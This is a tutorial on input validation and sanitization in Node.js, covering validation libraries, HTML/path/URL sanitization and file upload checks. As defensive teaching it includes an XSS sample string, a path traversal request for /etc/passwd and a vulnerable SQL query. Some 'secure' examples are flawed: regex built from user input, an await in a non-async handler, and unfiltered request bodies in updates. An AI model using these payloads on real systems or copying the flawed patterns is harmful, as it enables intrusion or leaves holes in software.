# Input Validation & Sanitization

## Overview

Input validation is the **first line of defense** against most web application attacks. It ensures that user-provided data meets your application's requirements before processing, preventing malicious data from entering your system.

**Why It Matters:**
- **80% of web vulnerabilities** stem from improper input validation
- Prevents SQL injection, XSS, command injection, and many other attacks
- Essential for data integrity and business logic correctness
- One of the most frequently asked security topics in interviews

## Core Concepts

### 💡 **Validation vs Sanitization**

Two complementary security approaches that work together.

**Validation:**
- **Checks if input meets requirements**
- Accept or reject the input
- Examples: length check, format check, type check
- Returns error if validation fails

**Sanitization:**
- **Cleans/modifies input to make it safe**
- Transforms input to remove dangerous characters
- Examples: HTML encoding, trimming whitespace, removing special chars
- Always returns transformed output

**Comparison:**

| Aspect | Validation | Sanitization |
|--------|-----------|--------------|
| **Purpose** | Check correctness | Make safe |
| **Action** | Accept/Reject | Transform |
| **Output** | Pass/Fail + errors | Cleaned data |
| **Example** | Email format check | Remove `<script>` tags |
| **When** | First step | After validation |

**Best Practice:**
> **Always validate first, then sanitize.** Validation ensures data meets requirements, sanitization ensures it's safe to use.

### 💡 **Server-Side vs Client-Side Validation**

Both have their place, but **server-side is mandatory**.

**Client-Side Validation:**

**Pros:**
- ✅ Instant feedback to users
- ✅ Better UX (no server round-trip)
- ✅ Reduces server load
- ✅ Can catch typos before submission

**Cons:**
- ❌ **Can be bypassed** (disable JavaScript, modify DOM)
- ❌ **Not a security measure**
- ❌ Can't validate against database (uniqueness checks)
- ❌ Users can send requests directly to API

**Server-Side Validation:**

**Pros:**
- ✅ **Cannot be bypassed** - mandatory security layer
- ✅ Single source of truth
- ✅ Can validate against database
- ✅ Protects API endpoints

**Cons:**
- ❌ Slower UX (network round-trip)
- ❌ More server load

**Decision:**

```
Client-Side Validation:
✅ Use for: UX improvement, instant feedback
❌ Never rely on for: Security

Server-Side Validation:
✅ Use for: Security, data integrity
✅ Always required for: Every single input
```

**Key Insight:**
> **Never trust the client.** Attackers can bypass all client-side validation. Server-side validation is the only real security measure.

### 💡 **Trust Boundaries**

Understanding where data comes from and what to trust.

**Untrusted Sources:**
- ❌ Request body (POST/PUT data)
- ❌ Query parameters (?id=123)
- ❌ URL path parameters (/users/123)
- ❌ Request headers
- ❌ Cookies
- ❌ File uploads
- ❌ Environment variables (in some contexts)
- ❌ External API responses

**Trusted Sources:**
- ✅ Constants defined in code
- ✅ Configuration files (if properly secured)
- ✅ Internal function outputs (after validation)

**Rule:**
```
If data originates from outside your application,
ALWAYS validate and sanitize it.
```

## Validation Types

### 1. Data Type Validation

Ensure input matches expected data type.

**Common Types:**

```javascript
const typeValidation = {
  string: (value) => typeof value === 'string',
  number: (value) => typeof value === 'number' && !isNaN(value),
  boolean: (value) => typeof value === 'boolean',
  array: (value) => Array.isArray(value),
  object: (value) => typeof value === 'object' && value !== null,
  integer: (value) => Number.isInteger(value),
  email: (value) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value),
  url: (value) => {
    try {
      new URL(value);
      return true;
    } catch {
      return false;
    }
  },
};
```

**Example:**

```javascript
// ❌ Bad - No type validation
app.post('/api/users', (req, res) => {
  const age = req.body.age; // Could be string "25", null, undefined, "abc"
  // Age comparison fails silently
  if (age > 18) { /* ... */ }
});

// ✅ Good - Type validation
app.post('/api/users', (req, res) => {
  const age = parseInt(req.body.age, 10);

  if (isNaN(age)) {
    return res.status(400).json({ error: 'Age must be a number' });
  }

  if (age > 18) { /* ... */ }
});
```

### 2. Length Validation

Prevent buffer overflows and DoS attacks.

**Validation Checks:**

```javascript
const lengthValidation = {
  // Minimum length
  minLength: (value, min) => value.length >= min,

  // Maximum length
  maxLength: (value, max) => value.length <= max,

  // Exact length
  exactLength: (value, length) => value.length === length,

  // Range
  lengthInRange: (value, min, max) =>
    value.length >= min && value.length <= max,
};
```

**Example:**

```javascript
// ✅ Length validation for various fields
const validateUser = (user) => {
  const errors = [];

  if (user.username.length < 3 || user.username.length > 30) {
    errors.push('Username must be 3-30 characters');
  }

  if (user.password.length < 8 || user.password.length > 128) {
    errors.push('Password must be 8-128 characters');
  }

  if (user.bio && user.bio.length > 500) {
    errors.push('Bio must not exceed 500 characters');
  }

  return errors;
};
```

**Common Limits:**

| Field | Min | Max | Reason |
|-------|-----|-----|--------|
| Username | 3 | 30 | Usability + DB limits |
| Password | 8 | 128 | Security + bcrypt limit |
| Email | 5 | 254 | RFC 5321 limit |
| Phone | 10 | 15 | International formats |
| Name | 1 | 100 | Reasonable person name |
| Bio/Description | 0 | 500-5000 | Context dependent |

### 3. Format Validation

Ensure input matches expected format using regex.

**Common Patterns:**

```javascript
const formatValidation = {
  // Email (simple)
  email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,

  // Email (RFC 5322 compliant - more strict)
  emailStrict: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,

  // Phone (US format)
  phoneUS: /^(\+1)?[-.\s]?\(?[2-9]\d{2}\)?[-.\s]?\d{3}[-.\s]?\d{4}$/,

  // Phone (international)
  phoneInternational: /^\+?[1-9]\d{1,14}$/,

  // URL
  url: /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)$/,

  // Username (alphanumeric + underscore)
  username: /^[a-zA-Z0-9_]{3,30}$/,

  // Alphanumeric only
  alphanumeric: /^[a-zA-Z0-9]+$/,

  // UUID v4
  uuid: /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i,

  // ISO 8601 date
  isoDate: /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d{3})?Z$/,

  // Credit card (basic format)
  creditCard: /^[0-9]{13,19}$/,

  // Hex color
  hexColor: /^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$/,

  // IP address (IPv4)
  ipv4: /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/,
};
```

**Example:**

```javascript
// ✅ Format validation
const validateEmail = (email) => {
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

  if (!emailRegex.test(email)) {
    return { valid: false, error: 'Invalid email format' };
  }

  return { valid: true };
};

// Usage
const email = 'user@example.com';
const result = validateEmail(email);

if (!result.valid) {
  return res.status(400).json({ error: result.error });
}
```

### 4. Range Validation

Ensure numeric input is within acceptable bounds.

**Example:**

```javascript
const rangeValidation = {
  // Between min and max
  inRange: (value, min, max) => value >= min && value <= max,

  // Greater than
  greaterThan: (value, threshold) => value > threshold,

  // Less than
  lessThan: (value, threshold) => value < threshold,

  // Positive number
  positive: (value) => value > 0,

  // Non-negative (including zero)
  nonNegative: (value) => value >= 0,
};

// ✅ Real-world example
const validateProductPrice = (price) => {
  const errors = [];

  if (typeof price !== 'number' || isNaN(price)) {
    errors.push('Price must be a number');
  }

  if (price < 0) {
    errors.push('Price cannot be negative');
  }

  if (price > 1000000) {
    errors.push('Price exceeds maximum allowed value');
  }

  // Check for too many decimal places
  const decimals = (price.toString().split('.')[1] || '').length;
  if (decimals > 2) {
    errors.push('Price cannot have more than 2 decimal places');
  }

  return errors;
};
```

### 5. Custom Business Logic Validation

Validation specific to your application's rules.

**Example:**

```javascript
// ✅ Custom validation functions
const businessValidation = {
  // Username availability
  isUsernameAvailable: async (username) => {
    const user = await User.findOne({ username });
    return !user;
  },

  // Email uniqueness
  isEmailUnique: async (email) => {
    const user = await User.findOne({ email });
    return !user;
  },

  // Age requirement (18+)
  isLegalAge: (birthdate) => {
    const age = Math.floor(
      (Date.now() - new Date(birthdate).getTime()) / (365.25 * 24 * 60 * 60 * 1000)
    );
    return age >= 18;
  },

  // Password strength
  isStrongPassword: (password) => {
    const hasUpperCase = /[A-Z]/.test(password);
    const hasLowerCase = /[a-z]/.test(password);
    const hasNumber = /[0-9]/.test(password);
    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
    const isLongEnough = password.length >= 8;

    return hasUpperCase && hasLowerCase && hasNumber && hasSpecialChar && isLongEnough;
  },

  // Valid date range (event must be in future)
  isFutureDate: (date) => {
    return new Date(date) > new Date();
  },

  // Stock availability
  isInStock: async (productId, quantity) => {
    const product = await Product.findById(productId);
    return product && product.stock >= quantity;
  },
};
```

## Validation Libraries

### 💡 **express-validator**

Built on validator.js, integrates seamlessly with Express.

**Installation:**

```bash
npm install express-validator
```

**Basic Usage:**

```javascript
const { body, validationResult } = require('express-validator');

// Validation rules
const validateUser = [
  body('email')
    .trim()
    .isEmail()
    .withMessage('Invalid email format')
    .normalizeEmail(),

  body('username')
    .trim()
    .isLength({ min: 3, max: 30 })
    .withMessage('Username must be 3-30 characters')
    .matches(/^[a-zA-Z0-9_]+$/)
    .withMessage('Username can only contain letters, numbers, and underscores'),

  body('password')
    .isLength({ min: 8 })
    .withMessage('Password must be at least 8 characters')
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
    .withMessage('Password must contain uppercase, lowercase, number, and special character'),

  body('age')
    .isInt({ min: 18, max: 120 })
    .withMessage('Age must be between 18 and 120'),
];

// Route with validation
app.post('/api/users', validateUser, (req, res) => {
  const errors = validationResult(req);

  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }

  // Validation passed
  const { email, username, password, age } = req.body;
  // Create user...
});
```

**Advanced Example:**

```javascript
const { body, query, param, validationResult } = require('express-validator');

// Validation middleware
const validate = (req, res, next) => {
  const errors = validationResult(req);

  if (!errors.isEmpty()) {
    return res.status(400).json({
      success: false,
      errors: errors.array().map(err => ({
        field: err.param,
        message: err.msg,
      })),
    });
  }

  next();
};

// Custom validators
const isUsernameAvailable = async (username) => {
  const user = await User.findOne({ username });
  if (user) {
    throw new Error('Username already taken');
  }
  return true;
};

// User registration validation
const validateRegistration = [
  body('email')
    .trim()
    .isEmail().withMessage('Invalid email')
    .normalizeEmail()
    .custom(async (email) => {
      const user = await User.findOne({ email });
      if (user) throw new Error('Email already registered');
      return true;
    }),

  body('username')
    .trim()
    .isLength({ min: 3, max: 30 }).withMessage('Username: 3-30 characters')
    .matches(/^[a-zA-Z0-9_]+$/).withMessage('Username: letters, numbers, underscore only')
    .custom(isUsernameAvailable),

  body('password')
    .isLength({ min: 8, max: 128 }).withMessage('Password: 8-128 characters')
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
    .withMessage('Password must contain: uppercase, lowercase, number, special char'),

  body('confirmPassword')
    .custom((value, { req }) => value === req.body.password)
    .withMessage('Passwords do not match'),

  body('birthdate')
    .isISO8601().withMessage('Invalid date format')
    .custom((value) => {
      const age = Math.floor((Date.now() - new Date(value)) / (365.25 * 24 * 60 * 60 * 1000));
      if (age < 18) throw new Error('Must be 18 or older');
      return true;
    }),
];

app.post('/api/register', validateRegistration, validate, async (req, res) => {
  // All validation passed
  const user = await User.create(req.body);
  res.status(201).json({ success: true, user });
});

// Query parameter validation
const validateSearch = [
  query('q')
    .trim()
    .notEmpty().withMessage('Search query required')
    .isLength({ max: 200 }).withMessage('Query too long'),

  query('page')
    .optional()
    .isInt({ min: 1 }).withMessage('Page must be positive integer')
    .toInt(),

  query('limit')
    .optional()
    .isInt({ min: 1, max: 100 }).withMessage('Limit: 1-100')
    .toInt(),
];

app.get('/api/search', validateSearch, validate, (req, res) => {
  const { q, page = 1, limit = 10 } = req.query;
  // Search logic...
});

// Path parameter validation
const validateUserId = [
  param('id')
    .isMongoId().withMessage('Invalid user ID format'),
];

app.get('/api/users/:id', validateUserId, validate, async (req, res) => {
  const user = await User.findById(req.params.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  res.json(user);
});
```

### 💡 **Joi**

Powerful schema-based validation library.

**Installation:**

```bash
npm install joi
```

**Basic Usage:**

```javascript
const Joi = require('joi');

// Define schema
const userSchema = Joi.object({
  email: Joi.string()
    .email()
    .required()
    .messages({
      'string.email': 'Invalid email format',
      'any.required': 'Email is required',
    }),

  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required(),

  password: Joi.string()
    .min(8)
    .max(128)
    .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
    .required()
    .messages({
      'string.pattern.base': 'Password must contain uppercase, lowercase, number, and special character',
    }),

  age: Joi.number()
    .integer()
    .min(18)
    .max(120)
    .required(),

  birthdate: Joi.date()
    .max('now')
    .required(),

  bio: Joi.string()
    .max(500)
    .optional(),
});

// Validation middleware
const validateBody = (schema) => {
  return (req, res, next) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false, // Return all errors
      stripUnknown: true, // Remove unknown fields
    });

    if (error) {
      const errors = error.details.map(detail => ({
        field: detail.path.join('.'),
        message: detail.message,
      }));

      return res.status(400).json({ errors });
    }

    req.body = value; // Use validated/sanitized value
    next();
  };
};

// Use in route
app.post('/api/users', validateBody(userSchema), (req, res) => {
  // req.body is validated and sanitized
  const user = User.create(req.body);
  res.status(201).json(user);
});
```

**Advanced Joi Schema:**

```javascript
const Joi = require('joi');

// Custom validators
const phoneValidator = (value, helpers) => {
  const phoneRegex = /^\+?[1-9]\d{1,14}$/;
  if (!phoneRegex.test(value)) {
    return helpers.error('any.invalid');
  }
  return value;
};

// Comprehensive schema
const registrationSchema = Joi.object({
  // Email with custom validation
  email: Joi.string()
    .email()
    .lowercase()
    .trim()
    .required()
    .external(async (value) => {
      const exists = await User.findOne({ email: value });
      if (exists) throw new Error('Email already registered');
    }),

  // Username with dependencies
  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required()
    .external(async (value) => {
      const exists = await User.findOne({ username: value });
      if (exists) throw new Error('Username taken');
    }),

  // Password with confirmation
  password: Joi.string()
    .min(8)
    .max(128)
    .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
    .required(),

  confirmPassword: Joi.string()
    .valid(Joi.ref('password'))
    .required()
    .messages({
      'any.only': 'Passwords must match',
    }),

  // Phone with custom validator
  phone: Joi.string()
    .custom(phoneValidator)
    .required()
    .messages({
      'any.invalid': 'Invalid phone number format',
    }),

  // Age with date validation
  birthdate: Joi.date()
    .max('now')
    .custom((value, helpers) => {
      const age = Math.floor((Date.now() - value.getTime()) / (365.25 * 24 * 60 * 60 * 1000));
      if (age < 18) return helpers.error('any.invalid');
      return value;
    })
    .required()
    .messages({
      'any.invalid': 'Must be 18 or older',
    }),

  // Nested object
  address: Joi.object({
    street: Joi.string().max(100).required(),
    city: Joi.string().max(50).required(),
    state: Joi.string().length(2).uppercase().required(),
    zipCode: Joi.string().pattern(/^\d{5}(-\d{4})?$/).required(),
  }).required(),

  // Array of strings
  interests: Joi.array()
    .items(Joi.string().max(50))
    .min(1)
    .max(10)
    .unique()
    .optional(),

  // Conditional field
  subscribe: Joi.boolean().default(false),

  // Required if subscribe is true
  notificationEmail: Joi.when('subscribe', {
    is: true,
    then: Joi.string().email().required(),
    otherwise: Joi.forbidden(),
  }),
}).unknown(false); // Reject unknown fields

// Async validation
app.post('/api/register', async (req, res) => {
  try {
    const value = await registrationSchema.validateAsync(req.body, {
      abortEarly: false,
    });

    // Create user with validated data
    const user = await User.create(value);
    res.status(201).json({ success: true, user });
  } catch (error) {
    if (error.isJoi) {
      return res.status(400).json({
        errors: error.details.map(d => ({
          field: d.path.join('.'),
          message: d.message,
        })),
      });
    }

    // Database or external validation error
    res.status(400).json({ error: error.message });
  }
});
```

### 💡 **Yup**

Similar to Joi, popular in React ecosystem.

**Installation:**

```bash
npm install yup
```

**Usage:**

```javascript
const yup = require('yup');

// Define schema
const userSchema = yup.object({
  email: yup.string()
    .email('Invalid email')
    .required('Email is required'),

  username: yup.string()
    .min(3, 'Username must be at least 3 characters')
    .max(30, 'Username must not exceed 30 characters')
    .matches(/^[a-zA-Z0-9_]+$/, 'Username can only contain letters, numbers, and underscores')
    .required('Username is required'),

  password: yup.string()
    .min(8, 'Password must be at least 8 characters')
    .matches(
      /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/,
      'Password must contain uppercase, lowercase, number, and special character'
    )
    .required('Password is required'),

  age: yup.number()
    .positive('Age must be positive')
    .integer('Age must be an integer')
    .min(18, 'Must be 18 or older')
    .max(120, 'Invalid age')
    .required('Age is required'),
});

// Validation
app.post('/api/users', async (req, res) => {
  try {
    const validatedData = await userSchema.validate(req.body, {
      abortEarly: false, // Return all errors
      stripUnknown: true, // Remove unknown fields
    });

    // Use validated data
    const user = await User.create(validatedData);
    res.status(201).json(user);
  } catch (error) {
    if (error.name === 'ValidationError') {
      return res.status(400).json({
        errors: error.inner.map(err => ({
          field: err.path,
          message: err.message,
        })),
      });
    }

    res.status(500).json({ error: 'Internal server error' });
  }
});
```

### Library Comparison

| Feature | express-validator | Joi | Yup |
|---------|------------------|-----|-----|
| **Integration** | Express-specific | Framework-agnostic | Framework-agnostic |
| **API Style** | Chained middleware | Schema objects | Schema objects |
| **Learning Curve** | Easy | Moderate | Easy |
| **Performance** | Fast | Very fast | Fast |
| **Async Validation** | ✅ | ✅ | ✅ |
| **Custom Validators** | ✅ | ✅ | ✅ |
| **TypeScript** | Good | Excellent | Excellent |
| **Bundle Size** | Medium | Large | Small |
| **Best For** | Express apps | Complex validation | React + Backend |

## Sanitization

### 💡 **What is Sanitization?**

Cleaning input data to remove or encode potentially dangerous content.

**Key Techniques:**

```javascript
const sanitization = {
  // 1. Trim whitespace
  trim: (str) => str.trim(),

  // 2. Escape HTML
  escapeHtml: (str) => {
    const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '/': '&#x2F;',
    };
    return str.replace(/[&<>"'/]/g, (char) => map[char]);
  },

  // 3. Remove HTML tags
  stripHtml: (str) => str.replace(/<[^>]*>/g, ''),

  // 4. Remove special characters
  removeSpecialChars: (str) => str.replace(/[^a-zA-Z0-9\s]/g, ''),

  // 5. Normalize whitespace
  normalizeWhitespace: (str) => str.replace(/\s+/g, ' ').trim(),

  // 6. Convert to lowercase
  lowercase: (str) => str.toLowerCase(),

  // 7. Remove null bytes (path traversal prevention)
  removeNullBytes: (str) => str.replace(/\0/g, ''),

  // 8. Limit length
  limitLength: (str, max) => str.slice(0, max),
};
```

### HTML Sanitization

Prevent XSS attacks by sanitizing HTML content.

**Using DOMPurify (Node.js):**

```bash
npm install isomorphic-dompurify
```

```javascript
const createDOMPurify = require('isomorphic-dompurify');
const DOMPurify = createDOMPurify();

// Sanitize HTML
const sanitizeHtml = (dirty) => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: [],
  });
};

// Example
const userInput = '<script>alert("XSS")</script><p>Safe content</p>';
const clean = sanitizeHtml(userInput);
// Result: '<p>Safe content</p>'

app.post('/api/comments', (req, res) => {
  const { content } = req.body;

  // Sanitize HTML content
  const sanitizedContent = sanitizeHtml(content);

  const comment = await Comment.create({
    content: sanitizedContent,
    userId: req.user.id,
  });

  res.status(201).json(comment);
});
```

**Using sanitize-html:**

```bash
npm install sanitize-html
```

```javascript
const sanitizeHtml = require('sanitize-html');

const clean = sanitizeHtml(dirty, {
  allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br', 'a', 'ul', 'ol', 'li'],
  allowedAttributes: {
    'a': ['href'],
  },
  allowedSchemes: ['http', 'https', 'mailto'],
});
```

### SQL Sanitization

**Note:** Full SQL injection prevention is covered in 07-sql-injection.md

**Quick Preview:**

```javascript
// ❌ NEVER do this - SQL injection vulnerable
const query = `SELECT * FROM users WHERE username = '${username}'`;

// ✅ Use parameterized queries
const query = 'SELECT * FROM users WHERE username = ?';
db.query(query, [username]);

// ✅ Or use ORM
const user = await User.findOne({ where: { username } });
```

### Path Sanitization

Prevent path traversal attacks.

```javascript
const path = require('path');

const sanitizePath = (userPath) => {
  // Remove null bytes
  userPath = userPath.replace(/\0/g, '');

  // Normalize path (removes ../)
  const normalized = path.normalize(userPath);

  // Ensure path doesn't escape base directory
  const baseDir = '/app/uploads';
  const fullPath = path.join(baseDir, normalized);

  if (!fullPath.startsWith(baseDir)) {
    throw new Error('Invalid path');
  }

  return fullPath;
};

// ❌ Vulnerable
app.get('/files/:filename', (req, res) => {
  const filePath = `/app/uploads/${req.params.filename}`;
  // User could request: ../../../../etc/passwd
  res.sendFile(filePath);
});

// ✅ Secure
app.get('/files/:filename', (req, res) => {
  try {
    const safePath = sanitizePath(req.params.filename);
    res.sendFile(safePath);
  } catch (error) {
    res.status(400).json({ error: 'Invalid filename' });
  }
});
```

### URL Sanitization

```javascript
const sanitizeUrl = (url) => {
  try {
    const parsed = new URL(url);

    // Allow only HTTP/HTTPS
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      throw new Error('Invalid protocol');
    }

    // Optional: whitelist domains
    const allowedDomains = ['example.com', 'api.example.com'];
    if (!allowedDomains.includes(parsed.hostname)) {
      throw new Error('Domain not allowed');
    }

    return parsed.href;
  } catch (error) {
    throw new Error('Invalid URL');
  }
};

// Usage
app.post('/api/webhook', (req, res) => {
  try {
    const safeUrl = sanitizeUrl(req.body.callbackUrl);
    // Use safe URL...
  } catch (error) {
    return res.status(400).json({ error: error.message });
  }
});
```

## File Upload Validation

### File Type Validation

**Multiple layers of validation:**

```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// 1. File extension check (weak - can be bypassed)
const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];

// 2. MIME type check (better)
const allowedMimeTypes = [
  'image/jpeg',
  'image/png',
  'image/gif',
  'application/pdf',
];

// 3. Magic number check (best)
const magicNumbers = {
  'image/jpeg': ['ffd8ffe0', 'ffd8ffe1', 'ffd8ffe2'],
  'image/png': ['89504e47'],
  'image/gif': ['47494638'],
  'application/pdf': ['25504446'],
};

const checkMagicNumber = (buffer, mimeType) => {
  const hex = buffer.toString('hex', 0, 4);
  const validNumbers = magicNumbers[mimeType];

  if (!validNumbers) return false;

  return validNumbers.some(magic => hex.startsWith(magic));
};

// Multer configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    // Generate random filename (prevent overwrites)
    const randomName = crypto.randomBytes(16).toString('hex');
    const ext = path.extname(file.originalname);
    cb(null, `${randomName}${ext}`);
  },
});

const fileFilter = (req, file, cb) => {
  // 1. Check file extension
  const ext = path.extname(file.originalname).toLowerCase();
  if (!allowedExtensions.includes(ext)) {
    return cb(new Error('Invalid file type'), false);
  }

  // 2. Check MIME type
  if (!allowedMimeTypes.includes(file.mimetype)) {
    return cb(new Error('Invalid MIME type'), false);
  }

  cb(null, true);
};

const upload = multer({
  storage,
  fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 1, // Max number of files
  },
});

// Upload endpoint
app.post('/api/upload', upload.single('file'), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  // 3. Verify magic number
  const fs = require('fs');
  const buffer = fs.readFileSync(req.file.path);

  if (!checkMagicNumber(buffer.slice(0, 4), req.file.mimetype)) {
    // Delete invalid file
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'File content does not match type' });
  }

  res.json({
    message: 'File uploaded successfully',
    filename: req.file.filename,
    size: req.file.size,
  });
});

// Error handling
app.use((error, req, res, next) => {
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).json({ error: 'File too large (max 5MB)' });
    }
    if (error.code === 'LIMIT_FILE_COUNT') {
      return res.status(400).json({ error: 'Too many files' });
    }
  }

  res.status(400).json({ error: error.message });
});
```

### File Name Sanitization

```javascript
const sanitizeFilename = (filename) => {
  // Remove path separators
  let safe = filename.replace(/[\/\\]/g, '');

  // Remove null bytes
  safe = safe.replace(/\0/g, '');

  // Remove control characters
  safe = safe.replace(/[\x00-\x1f\x80-\x9f]/g, '');

  // Remove special characters
  safe = safe.replace(/[<>:"|?*]/g, '');

  // Limit length
  safe = safe.slice(0, 255);

  // Prevent hidden files
  if (safe.startsWith('.')) {
    safe = safe.slice(1);
  }

  return safe || 'unnamed';
};

// Usage
const safeFilename = sanitizeFilename(req.file.originalname);
```

## Complete Validation Examples

### REST API with Comprehensive Validation

```javascript
const express = require('express');
const { body, query, param, validationResult } = require('express-validator');
const app = express();

app.use(express.json());

// Validation middleware
const validate = (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      success: false,
      errors: errors.array().map(err => ({
        field: err.param,
        message: err.msg,
        value: err.value,
      })),
    });
  }
  next();
};

// User Registration
app.post(
  '/api/register',
  [
    body('email')
      .trim()
      .isEmail().withMessage('Invalid email')
      .normalizeEmail()
      .custom(async (email) => {
        const exists = await User.findOne({ email });
        if (exists) throw new Error('Email already registered');
      }),

    body('username')
      .trim()
      .isLength({ min: 3, max: 30 }).withMessage('Username: 3-30 characters')
      .matches(/^[a-zA-Z0-9_]+$/).withMessage('Letters, numbers, underscore only')
      .custom(async (username) => {
        const exists = await User.findOne({ username });
        if (exists) throw new Error('Username taken');
      }),

    body('password')
      .isLength({ min: 8, max: 128 }).withMessage('Password: 8-128 characters')
      .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
      .withMessage('Must contain: uppercase, lowercase, number, special char'),

    body('age')
      .isInt({ min: 18, max: 120 }).withMessage('Age: 18-120')
      .toInt(),
  ],
  validate,
  async (req, res) => {
    const user = await User.create(req.body);
    res.status(201).json({ success: true, user });
  }
);

// Get Users (with pagination)
app.get(
  '/api/users',
  [
    query('page')
      .optional()
      .isInt({ min: 1 }).withMessage('Page must be positive')
      .toInt(),

    query('limit')
      .optional()
      .isInt({ min: 1, max: 100 }).withMessage('Limit: 1-100')
      .toInt(),

    query('search')
      .optional()
      .trim()
      .isLength({ max: 200 }).withMessage('Search query too long'),

    query('sortBy')
      .optional()
      .isIn(['createdAt', 'username', 'email']).withMessage('Invalid sort field'),

    query('order')
      .optional()
      .isIn(['asc', 'desc']).withMessage('Order must be asc or desc'),
  ],
  validate,
  async (req, res) => {
    const { page = 1, limit = 10, search, sortBy = 'createdAt', order = 'desc' } = req.query;

    const query = search ? { username: new RegExp(search, 'i') } : {};

    const users = await User.find(query)
      .sort({ [sortBy]: order === 'desc' ? -1 : 1 })
      .skip((page - 1) * limit)
      .limit(limit);

    const total = await User.countDocuments(query);

    res.json({
      success: true,
      data: users,
      pagination: {
        page,
        limit,
        total,
        pages: Math.ceil(total / limit),
      },
    });
  }
);

// Get User by ID
app.get(
  '/api/users/:id',
  [
    param('id')
      .isMongoId().withMessage('Invalid user ID'),
  ],
  validate,
  async (req, res) => {
    const user = await User.findById(req.params.id);
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }
    res.json({ success: true, data: user });
  }
);

// Update User
app.put(
  '/api/users/:id',
  [
    param('id').isMongoId().withMessage('Invalid user ID'),

    body('email')
      .optional()
      .trim()
      .isEmail().withMessage('Invalid email')
      .normalizeEmail(),

    body('username')
      .optional()
      .trim()
      .isLength({ min: 3, max: 30 }).withMessage('Username: 3-30 characters')
      .matches(/^[a-zA-Z0-9_]+$/),

    body('bio')
      .optional()
      .trim()
      .isLength({ max: 500 }).withMessage('Bio: max 500 characters'),
  ],
  validate,
  async (req, res) => {
    const user = await User.findByIdAndUpdate(
      req.params.id,
      req.body,
      { new: true, runValidators: true }
    );

    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }

    res.json({ success: true, data: user });
  }
);

// Delete User
app.delete(
  '/api/users/:id',
  [
    param('id').isMongoId().withMessage('Invalid user ID'),
  ],
  validate,
  async (req, res) => {
    const user = await User.findByIdAndDelete(req.params.id);

    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }

    res.json({ success: true, message: 'User deleted' });
  }
);

// Error handling
app.use((error, req, res, next) => {
  console.error(error);
  res.status(500).json({ success: false, error: 'Internal server error' });
});
```

### NestJS with class-validator

```typescript
// user.dto.ts
import {
  IsEmail,
  IsString,
  IsInt,
  MinLength,
  MaxLength,
  Min,
  Max,
  Matches,
  IsOptional,
} from 'class-validator';

export class CreateUserDto {
  @IsEmail({}, { message: 'Invalid email format' })
  email: string;

  @IsString()
  @MinLength(3, { message: 'Username must be at least 3 characters' })
  @MaxLength(30, { message: 'Username must not exceed 30 characters' })
  @Matches(/^[a-zA-Z0-9_]+$/, {
    message: 'Username can only contain letters, numbers, and underscores',
  })
  username: string;

  @IsString()
  @MinLength(8, { message: 'Password must be at least 8 characters' })
  @MaxLength(128, { message: 'Password must not exceed 128 characters' })
  @Matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/, {
    message: 'Password must contain uppercase, lowercase, number, and special character',
  })
  password: string;

  @IsInt({ message: 'Age must be an integer' })
  @Min(18, { message: 'Must be at least 18 years old' })
  @Max(120, { message: 'Invalid age' })
  age: number;

  @IsOptional()
  @IsString()
  @MaxLength(500, { message: 'Bio must not exceed 500 characters' })
  bio?: string;
}

// user.controller.ts
import { Controller, Post, Body, ValidationPipe } from '@nestjs/common';

@Controller('users')
export class UserController {
  @Post()
  async create(@Body(new ValidationPipe()) createUserDto: CreateUserDto) {
    // DTO is automatically validated
    return this.userService.create(createUserDto);
  }
}
```

## Whitelist vs Blacklist

